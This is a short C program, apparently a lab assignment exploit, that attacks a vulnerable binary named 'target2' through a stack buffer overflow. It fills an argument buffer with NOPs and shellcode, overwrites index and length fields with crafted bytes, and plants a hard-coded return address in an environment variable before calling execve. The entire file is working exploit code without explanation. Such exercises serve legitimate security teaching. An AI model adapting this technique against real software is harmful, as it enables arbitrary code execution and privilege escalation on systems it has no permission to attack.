#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define RA "\x40\xfd\x21\x20"
#define ARGLEN 271
#define NOP 0x90
#define CURRI "\x0b"
#define FAKELEN "\x1c\x01"
#define ENVLEN 13
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[2];

	char buf[ARGLEN];
	memset(buf,NOP,ARGLEN);
	memcpy(buf,shellcode,strlen(shellcode));
	memcpy(buf+ARGLEN-7,CURRI,1);
	memcpy(buf+ARGLEN-3,FAKELEN,2);
	buf[ARGLEN-1]='\0';

	char envbuf[ENVLEN];
	memset(envbuf,NOP,ENVLEN);
	int i;
	for(i = 0; i < ENVLEN-1; i+=4){
		memcpy(envbuf+i,RA,4);
	}

	envbuf[ENVLEN-1] = '\0';
	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

	env[0] = "";
	env[1] = envbuf;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
